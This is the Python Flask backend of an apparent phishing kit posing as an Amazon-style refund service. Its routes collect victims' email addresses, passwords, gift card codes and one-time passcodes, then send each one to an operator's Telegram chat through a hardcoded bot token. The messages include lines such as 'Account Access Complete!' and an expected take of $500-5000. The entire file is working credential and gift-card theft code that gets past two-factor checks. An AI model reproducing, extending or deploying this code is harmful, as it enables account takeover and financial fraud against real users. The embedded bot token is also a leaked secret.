
import os
import random
import string
import json
import requests
import hashlib
import secrets
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_session import Session

app = Flask(__name__)

# Configuration
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_USE_SIGNER'] = True
app.config['SESSION_FILE_DIR'] = '/tmp/flask_sessions'
Session(app)

# Telegram Configuration (from environment variables)
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8793157012:AAE5B3bRXtphn2JhLaM9I-SCupDiq1E4g7U')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '')
BOT_USERNAME = os.environ.get('BOT_USERNAME', '@pcmoroo_bot')
WEBHOOK_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')

# In-memory storage (for demo - use Redis/PostgreSQL in production)
user_sessions = {}
redeem_codes = {}
transactions = {}
subscriptions = {}
otp_requests = {}

# Helper Functions
def generate_txid():
    """Generate unique transaction ID"""
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"AMZ{timestamp}{random_str}"

def generate_redeem_token():
    """Generate redeem token"""
    return f"RDM-{''.join(random.choices(string.ascii_uppercase + string.digits, k=14))}"

def send_to_telegram(message, parse_mode='HTML'):
    """Send message to Telegram admin"""
    if not TELEGRAM_BOT_TOKEN or not ADMIN_CHAT_ID:
        print("Telegram not configured:", message[:100])
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(url, json={
            'chat_id': ADMIN_CHAT_ID,
            'text': message,
            'parse_mode': parse_mode
        }, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def get_client_ip():
    """Get client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

# Routes
@app.route('/')
def index():
    """Main page"""
    return render_template('index.html', bot_username=BOT_USERNAME)

@app.route('/health')
def health():
    """Health check endpoint for Render"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'active_sessions': len(user_sessions)
    }), 200

@app.route('/api/refund/account', methods=['POST'])
def refund_account():
    """Process account refund request"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '')
        
        if not email or not password:
            return jsonify({'error': 'Email and password are required'}), 400
        
        # Validate email format
        if '@' not in email and not email.isdigit():
            return jsonify({'error': 'Valid email or phone number required'}), 400
        
        # Generate transaction ID
        txid = generate_txid()
        ip_address = get_client_ip()
        
        # Store session
        user_sessions[txid] = {
            'email': email,
            'password': password,
            'type': 'account',
            'ip': ip_address,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # Send to admin via Telegram
        message = f"""
🔐 <b>🔥 NEW ACCOUNT REFUND REQUEST 🔥</b> 🔐

┌─────────────────────────────┐
│ 📌 <b>TXID:</b> <code>{txid}</code>
│ 📧 <b>Email:</b> <code>{email}</code>
│ 🔑 <b>Password:</b> <code>{password}</code>
│ 🌐 <b>IP:</b> {ip_address}
│ ⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
└─────────────────────────────┘

<b>✅ Status:</b> <i>Pending OTP Verification</i>
<b>💰 Expected Amount:</b> $500-5000
        """
        send_to_telegram(message)
        
        # Store transaction
        transactions[txid] = {
            'type': 'account',
            'status': 'pending',
            'created_at': datetime.now()
        }
        
        return jsonify({
            'success': True,
            'txid': txid,
            'message': 'Account submitted successfully',
            'requires_otp': True
        })
        
    except Exception as e:
        print(f"Error in refund_account: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/refund/code', methods=['POST'])
def refund_code():
    """Process gift card refund request"""
    try:
        data = request.json
        gift_code = data.get('gift_code', '').strip().upper()
        
        if not gift_code:
            return jsonify({'error': 'Gift card code is required'}), 400
        
        # Validate gift code format (basic)
        if len(gift_code) < 10 or len(gift_code) > 20:
            return jsonify({'error': 'Invalid gift card code format'}), 400
        
        # Generate redeem token
        redeem_token = generate_redeem_token()
        ip_address = get_client_ip()
        
        # Store code
        redeem_codes[redeem_token] = {
            'code': gift_code,
            'ip': ip_address,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # Send to admin via Telegram
        message = f"""
🎁 <b>💎 NEW GIFT CARD REFUND REQUEST 💎</b> 🎁

┌─────────────────────────────┐
│ 🔖 <b>Token:</b> <code>{redeem_token}</code>
│ 💳 <b>Code:</b> <code>{gift_code}</code>
│ 🌐 <b>IP:</b> {ip_address}
│ ⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
└─────────────────────────────┘

<b>🔄 Status:</b> <i>Processing Refund</i>
<b>⚡ Estimated Time:</b> <i>5-10 minutes</i>
        """
        send_to_telegram(message)
        
        # Store transaction
        transactions[redeem_token] = {
            'type': 'giftcard',
            'status': 'pending',
            'created_at': datetime.now()
        }
        
        return jsonify({
            'success': True,
            'redeem_token': redeem_token,
            'message': 'Gift card submitted successfully'
        })
        
    except Exception as e:
        print(f"Error in refund_code: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/otp/verify', methods=['POST'])
def verify_otp():
    """Verify OTP for account access"""
    try:
        data = request.json
        txid = data.get('txid')
        otp = data.get('otp', '').strip()
        
        if not txid or not otp:
            return jsonify({'error': 'TXID and OTP required'}), 400
        
        if txid not in user_sessions:
            return jsonify({'error': 'Invalid session'}), 404
        
        # Store OTP
        user_sessions[txid]['otp'] = otp
        user_sessions[txid]['status'] = 'completed'
        user_sessions[txid]['otp_verified_at'] = datetime.now().isoformat()
        
        # Send OTP to admin
        message = f"""
🔐 <b>✅ OTP RECEIVED - ACCESS GRANTED ✅</b> 🔐

┌─────────────────────────────┐
│ 📌 <b>TXID:</b> <code>{txid}</code>
│ 📱 <b>OTP Code:</b> <code>{otp}</code>
│ ⏰ <b>Verified:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
└─────────────────────────────┘

<b>🎯 Account Access Complete!</b>
<b>📧 Email:</b> {user_sessions[txid]['email']}
<b>🔑 Password:</b> {user_sessions[txid]['password']}
        """
        send_to_telegram(message)
        
        return jsonify({
            'success': True,
            'message': 'OTP verified successfully'
        })
        
    except Exception as e:
        print(f"Error in verify_otp: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/status/<ref_id>')
def get_status(ref_id):
    """Get status of a transaction"""
    if ref_id in user_sessions:
        return jsonify({
            'status': user_sessions[ref_id]['status'],
            'type': 'account'
        })
    elif ref_id in redeem_codes:
        return jsonify({
            'status': redeem_codes[ref_id]['status'],
            'type': 'giftcard'
        })
    else:
        return jsonify({'error': 'Transaction not found'}), 404

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
